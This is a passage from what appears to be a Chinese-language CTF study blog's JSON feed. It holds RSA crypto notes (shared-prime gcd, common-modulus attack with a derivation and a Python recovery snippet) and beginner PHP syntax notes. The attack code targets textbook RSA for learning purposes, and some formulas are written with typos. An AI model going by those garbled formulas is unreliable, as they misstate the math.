            "content_html": "<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h3 id=\"1crypto常见库\"><a class=\"anchor\" href=\"#1crypto常见库\">#</a> 1.Crypto 常见库</h3>\n<p><code>gmpy2</code> ：一个用于高效数值计算的库，特别适用于大整数的运算</p>\n<p><code>Crypto.Util.number</code> ：提供了生成大素数和处理大整数的功能</p>\n<h3 id=\"2getprime函数\"><a class=\"anchor\" href=\"#2getprime函数\">#</a> 2.getPrime 函数</h3>\n<p>getPrime 函数用于生成 n 位的随机素数，其中 n 位指的是这个数二进制中包含 n 个二进制位，在保存时以十进制 (长整形) 存储。</p>\n<h3 id=\"3powmod函数\"><a class=\"anchor\" href=\"#3powmod函数\">#</a> 3.powmod 函数</h3>\n<p>powmod (m,e,n) 计算 m 的 e 次幂并对 n 取模，这是 RSA 加密核心计算，常见于 RSA 加密中。</p>\n<h3 id=\"4rsa\"><a class=\"anchor\" href=\"#4rsa\">#</a> 4.RSA</h3>\n<p>RSA 模数 n，密文 c，公钥指数 e，</p>\n<p>私钥 d 为 ϕ(n)=(p−1)(q−1)，这一步通常需要使用 yafu,yafu-x64 factor (n) 分解</p>\n<p>d=e−1 次方 modϕ(n) d=inverse (e)</p>\n<p>得到私钥后，可以以哦那个来解密密文 c:</p>\n<p>m=c 的 d 次方 mod n</p>\n<h5 id=\"nextprimen\"><a class=\"anchor\" href=\"#nextprimen\">#</a> nextprime(n):</h5>\n<p>寻找一个比 n 稍大的下一个素数</p>\n<h5 id=\"gmpy2\"><a class=\"anchor\" href=\"#gmpy2\">#</a> gmpy2:</h5>\n<p>是一个高精度数学库</p>\n<p><strong>gmpy2.iroot(n,2)</strong>: 计算 n 的平方根并返回一个元组 (root (计算后的值),is_exact (布尔值))</p>\n<p><strong>gmpy2.gcdext</strong>: 返回一个元组，第一个值为最大公因数，第二个值为贝祖等式的系数 x, 第三个值为贝祖等式的系数 y。</p>\n<h5 id=\"共享素数\"><a class=\"anchor\" href=\"#共享素数\">#</a> 共享素数:</h5>\n<p>RSA 加密时进行了两次加密，并且给出了加密钥 e, 两次加密的 n1 和 n2, 密文 c, 分别使用 n1 和 n2，这个时候就可以看看两个 n 之间是否存在共用的素数。q=gmpy2.gcd (n1,n2)</p>\n<h5 id=\"共模攻击\"><a class=\"anchor\" href=\"#共模攻击\">#</a> 共模攻击：</h5>\n<p>当 e1，e2 互质时，gcd (e1,e2)=1, 那么一定存在整数 x,y 使得 gcd (a,b)=ax+by,</p>\n<p>所以得到 e1 * s1+e2 * s2=1</p>\n<p>因为 e1 和 e2 为正整数，所以 s1、s2 皆为整数，其中一个为正一个为负</p>\n<p><strong>推导过程</strong>:</p>\n<pre><code>这里需要用到两条幂运算的性质：\n\n(a * b) % p = (a % p * b % p) % p\na ^ b % p = ((a % p) ^ b) % p\n\n因为c1 = m^e1%n，c2 = m^e2%n，需要证明m=(c1^s1*c2^s2)%n\n\n代入可得：\n\n(c1^s1*c2^s2)%n = ((m^e1%n)^s1(m^e2%n)^s2)%n\n\n                             =((m^e1%n)^s1*(m^e2%n)^s2)%n\n\n                             =((m^e1)^s1%n*(m^e2)^s2%n)%n   //消掉%n\n\n                             =((m^e1)^s1*(m^e2)^s2)%n\n\n                             =((m^(e1*s1)*(m^(e2*s2))%n   //幂的乘方，底数不变，指数相乘\n\n                             =(m^(e1*s1+e2*s2))%n   //同底数幂相乘，底数不变，指数相加\n\n又因为m&lt;n，所以(c1^s1*c2^s2)%n=m%n=m\n</code></pre>\n<p>所以 m 为 c1 的 t 次方 * c2 的 z 次方 mod n 不需要去求 phi</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> t <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 要求 c 的 s 次幂，就要先计算 c 的模反元素 c2r，然后求 c2r 的 - s2 次幂</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        t <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> t</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        c1 <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 求 c1 的逆元</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">elif</span> z <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        z <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>z</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        c2 <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    m <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n  <span class=\"token comment\"># (c1^s1*c2^s2)%n=m%n=m</span></pre></td></tr></table></figure><p>之所以可以这样计算，是因为当在 mod n 的情况下，和 c1 互为逆元的数可以当作是 c1 的倒数，而一个数的负指数次方等于一个数指数次方分之一。</p>\n",
            "tags": [
                "CTF",
                "Crypto"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2024/11/15/CTF/Web/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "https://ly1tnt.github.io/2024/11/15/CTF/Web/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "PHP学习笔记",
            "date_published": "2024-11-15T08:49:12.000Z",
            "content_html": "<h1 id=\"php学习笔记\"><a class=\"anchor\" href=\"#php学习笔记\">#</a> PHP 学习笔记</h1>\n<h2 id=\"一-基本知识\"><a class=\"anchor\" href=\"#一-基本知识\">#</a> 一、基本知识</h2>\n<h3 id=\"11函数知识\"><a class=\"anchor\" href=\"#11函数知识\">#</a> 1.1 函数知识</h3>\n<p>phpinfo: 这个函数会显示一个当前电脑 (服务器) 的详细 php 信息。</p>\n<h3 id=\"12常量变量\"><a class=\"anchor\" href=\"#12常量变量\">#</a> 1.2 常量变量</h3>\n<p>PHP 变量以美元符 $ 开始。</p>\n<p>变量可分类为：可变变量，外部变量，环境变量</p>\n<p>可变变量 EX：</p>\n<pre><code class=\"language-php+HTML\">&lt;?php\n// 服务器读取的  编码设置\n    header('Content-type:text/html;charset=utf-8');\n//定义了一个变量叫作$shu 将$shu这个变量的值设为字符串的biao\n$shu = ‘biao’；\n//定义了一个变量叫作$biao 将他的值设置为鼠标\n$biao = ‘鼠标’；\n//$$shu就是可变变量；在已声明的变量$shu前又加上了一个变量符\necho $$shu;\n?&gt;\n\n</code></pre>\n<p>外部变量 EX:</p>\n<pre><code class=\"language-php+HTML\">&lt;html&gt;\n  &lt;head&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n&lt;!-- 这一行method 对应的值改为post ---&gt;\n&lt;form action=&quot;req.php&quot; method=&quot;post&quot;&gt;\n&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;\n&lt;input type=&quot;password&quot; name=&quot;pwd&quot;/&gt;\n&lt;input type=&quot;submit&quot; name=&quot;提交&quot;/&gt;\n&lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n\n</code></pre>\n<p>PHP 代码调用</p>\n<pre><code class=\"language-php+HTML\">&lt;?php\n//$_POST[‘username’]，将username作为字符串放在中括号里面，就得到了表单里面的&lt;input type=”text”name=”username”/&gt;的值\n$u = $_POST['username'];\necho $u.'&lt;br /&gt;';\n//$_POST[‘pwd’]，将pwd作为字符串放在中括号里面，就得到了表单里面的&lt;input type=”text”name=”pwd”/&gt;的值\n$passwd = $_POST['pwd'];\necho $passwd.'&lt;br /&gt;';\n?&gt;\n\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/285dc7d06730539f99a0c9c31ec7fd56.png\" alt=\"在这里插入图片描述\" /></p>\n<p>环境变量:</p>\n<p>$_SERVER</p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/4f8f6205720abd0bd7767e16c6db4730.png\" alt=\"在这里插入图片描述\" /></p>\n<p>常量:</p>\n<p>代码中的定义:</p>\n<p>define (常量名，常量值)</p>\n<p>1、常量名可以小写，但是通常大写<br />\n 2、常量名可以不加引号，但是通常加上引号<br />\n 3、在字符串中调用常量的时候，必须在引号外面<br />\n 4、常量名建议只用字母和下划线</p>\n<pre><code class=\"language-php+HTML\">&lt;?php\ndefine('MY_NAME','PHP中文网');\necho MY_NAME;\n//下面是错误的调用方式\necho '我的名字是MY_NAME';\n//下面是正确的调用方式\necho '我的名字是'.MY_NAME;\n?&gt;\n\n</code></pre>\n<p>一些内置的常量</p>\n<h3 id=\"13php数据类型\"><a class=\"anchor\" href=\"#13php数据类型\">#</a> 1.3php 数据类型</h3>\n<h3 id=\"在这里插入图片描述\"><a class=\"anchor\" href=\"#在这里插入图片描述\">#</a> <img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/2d220531e183e4b5ee7bcdcb219b7a99.png\" alt=\"在这里插入图片描述\" /></h3>\n<p>2 种特殊的数据类型:</p>\n<p>resource（资源类型）与 null（无 / 空白类型）</p>\n<h3 id=\"14查看数据类型和判断数据类型\"><a class=\"anchor\" href=\"#14查看数据类型和判断数据类型\">#</a> 1.4 查看数据类型和判断数据类型</h3>\n<p>查看数据类型：<br />\n1、gettype（传入一个变量）能获得变量的类型<br />\n 2、var_dump（传入一个变量）输出变量类型和<strong>值</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 声明一个变量 88.8, 可以自己多做几次实现换成其他类型看看 $type 输出是多少。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$float</span> <span class=\"token operator\">=</span> <span class=\"token number\">88.8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$type</span> <span class=\"token operator\">=</span> <span class=\"token function\">gettype</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$float</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$type</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 多换几个类型试试</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'你喜欢男人还是喜欢女人'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$type</span> <span class=\"token operator\">=</span> <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$type</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>判断数据类型</p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/c6b3c0aea250a957614491288e8b1021.png\" alt=\"在这里插入图片描述\" /></p>\n<p>numeric: 数值</p>\n<p>callable: 函数</p>\n<p>scalar: 标量</p>\n<hr />\n<h3 id=\"15php三元运算符及其他运算符\"><a class=\"anchor\" href=\"#15php三元运算符及其他运算符\">#</a> 1.5PHP 三元运算符及其他运算符</h3>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/62c1cf6809c51789bdd42ef63d112533.png\" alt=\"在这里插入图片描述\" /></p>\n<h3 id=\"16php流程控制语句\"><a class=\"anchor\" href=\"#16php流程控制语句\">#</a> 1.6PHP 流程控制语句</h3>\n<p>if switch while for 基本与 c 相同</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">do</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token comment\">// 代码框</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>判断<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'第'</span><span class=\"token operator\">.</span><span class=\"token variable\">$i</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'每周往返北京大连&lt;br />'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">==</span> <span class=\"token number\">17</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">goto</span> end<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>end<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'集团公司要求停止此项'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"17php函数基本语法\"><a class=\"anchor\" href=\"#17php函数基本语法\">#</a> 1.7PHP 函数基本语法</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">Function</span> 函数名<span class=\"token punctuation\">(</span>参数名<span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>值<span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> 参数名<span class=\"token number\">2</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>值<span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> 参数名n<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>值n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    函数中的功能体</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token keyword\">return</span> 返回值<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>文件包含</p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/c9ab88ff7ea90290ca1e4cc82625d46d.png\" alt=\"在这里插入图片描述\" /></p>\n<p>数学常用函数总结:</p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/36f961d768a7b3a5b23764f164eb6657.png\" alt=\"在这里插入图片描述\" /></p>\n<p>字符串常用函数总结:</p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/078542c970bb9237220f2465ad0051d8.png\" alt=\"在这里插入图片描述\" /></p>\n<p>dirname:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$path</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"/var/www/html/index.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$dir</span> <span class=\"token operator\">=</span> <span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$dir</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出: /var/www/html</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/6ef56781615e9e7a561e6a7afd4dd003.png\" alt=\"在这里插入图片描述\" /></p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/8fb69b8c4548a9ebc0d93e865f5022ed.png\" alt=\"在这里插入图片描述\" /></p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/cdd032309af6962b40deac4f9f5961aa.png\" alt=\"在这里插入图片描述\" /></p>\n<p>疑似有点多了</p>\n<p>时间函数:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$mytime</span> <span class=\"token operator\">=</span> <span class=\"token function\">getdate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"年 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'year'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"月 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'mon'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"日 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'mday'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"时 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'hours'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"分 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'minutes'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"秒 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'seconds'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"一个小时中的第几钟 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'minutes'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"这是一分钟的第几秒 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'seconds'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"星期名称 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'weekday'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"月份名称 :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'month'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"时间戳   :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$mytime</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"18php数组结构\"><a class=\"anchor\" href=\"#18php数组结构\">#</a> 1.8PHP 数组结构</h3>\n<p>数组 array, 可以存入多个不同类型的数据，为复合数据类型。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$shu</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1.5</span> <span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span> <span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'你好，世界'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$shu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>关于为什么在 var_dump 前后加入  <code>echo &lt;pre&gt;：</code> echo '&lt;pre&gt;'; <code>将</code>  &lt;pre&gt; <code> 标签作为 HTML 输出到浏览器，这告诉浏览器开始一个预格式化的区域。</code> var_dump($shu); <code>输出数组的详细信息，这部分信息将被</code>  &lt;pre&gt; <code> 标签格式化。最后，</code> echo '&lt;/pre&gt;'; <code>关闭</code>  &lt;pre&gt;` 标签，结束预格式化区域。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$kele</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'只有不断努力才能博得未来'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'NoAlike'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'PHP中文网'</span> <span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'去PHP中文网学PHP'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'苹果和梨子我都爱'</span> <span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'橘子我最爱'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 打印显示 $kele</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$kele</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>通过键值对应符，可以做到索引数组下标不一次从 0 开始。</p>\n<p>常用操作数组函数</p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/ea9f295bd96ee181954261575f5a86ed.png\" alt=\"在这里插入图片描述\" /></p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/fe1450e0f985b4e9ec5b7efc7bbfdb6f.png\" alt=\"在这里插入图片描述\" /></p>\n<p><img loading=\"lazy\" data-src=\"https://i-blog.csdnimg.cn/blog_migrate/6052ec69dd479d31125234d8a574c04a.png\" alt=\"在这里插入图片描述\" /></p>\n<h3 id=\"19正则表达式\"><a class=\"anchor\" href=\"#19正则表达式\">#</a> 1.9 正则表达式</h3>\n<p>可以有效地处理和操纵文本。例如，它可以用于验证用户输入的数据格式（例如，姓名，电子邮件，电话号码等）是否正确，在文本内容中查找或替换匹配的字符串，等等。</p>\n<p>在正则表达式中具有特殊含义的字符是：. * ? + [] () { } ^ $ | \\。每当想按字面意义使用它们时，都需要反斜杠。例如，如果要匹配 “.”，则必须编写.。</p>\n<table>\n<thead>\n<tr>\n<th>[abc]</th>\n<th>匹配字符 a，b 或 c 中的任何一个。</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[^abc]</td>\n<td>匹配 a，b，c 以外的任何一个字符。</td>\n</tr>\n<tr>\n<td>[a-z]</td>\n<td>匹配从小写字母 a 到小写字母 z 的任意一个字符。</td>\n</tr>\n<tr>\n<td>[A-Z]</td>\n<td>匹配从大写字母 A 